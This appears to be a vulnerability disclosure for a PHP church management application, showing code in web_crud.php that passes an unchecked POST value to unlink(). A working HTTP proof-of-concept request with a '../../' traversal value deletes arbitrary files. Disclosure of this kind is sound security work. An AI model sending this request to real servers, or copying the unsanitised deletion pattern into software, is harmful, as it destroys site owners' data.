### Vulnerability file address

In line 370 of `church/admin/app/web_crud.php`, `@unlink("../../assets/images/" . $_POST['oldaboutphoto']);`,` $_POST['oldaboutphoto']` parameters have not been restricted, which causes any file to be deleted

```php
if (isset($_POST['update6'])) {
        // Function to generate unique file name
        function generateUniqueFileName($filename)
        {
            $ext = pathinfo($filename, PATHINFO_EXTENSION);
            $basename = pathinfo($filename, PATHINFO_FILENAME);
            $uniqueName = $basename . '_' . uniqid() . '.' . $ext;
            return $uniqueName;
        }

        if ($_FILES['aboutphoto']['tmp_name'] != '') {
            $filepath = "../../assets/images/" . generateUniqueFileName($_FILES["aboutphoto"]["name"]);

            if (move_uploaded_file($_FILES["aboutphoto"]["tmp_name"], $filepath)) {
                $img1 = basename($filepath);
                @unlink("../../assets/images/" . $_POST['oldaboutphoto']);
            }
        } 
```

### POC

```http
POST /church/admin/app/web_crud.php HTTP/1.1
Host: www.church.net
Connection: close
Cookie: PHPSESSID=hl5noegsdjn1ru7skoi8tmqco3
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Length: 377

------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="update6"

1
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="oldaboutphoto"

../../12.txt
------WebKitFormBoundaryTZGvWJmfBtMK9O8p
Content-Disposition: form-data; name="aboutphoto";filename="aaa.php"

this is test
------WebKitFormBoundaryTZGvWJmfBtMK9O8p--
```

### Attack results pictures

First, we create a `12.txt` file in the `church/` directory

![image-20250505160119530](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051601569.png)



Then we execute the above poc to attack

![image-20250505160221263](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051602288.png)

Files are deleted after the attack is successful

![image-20250505160211499](https://raw.githubusercontent.com/Amyppp/imgs/main/vuln/202505051602527.png)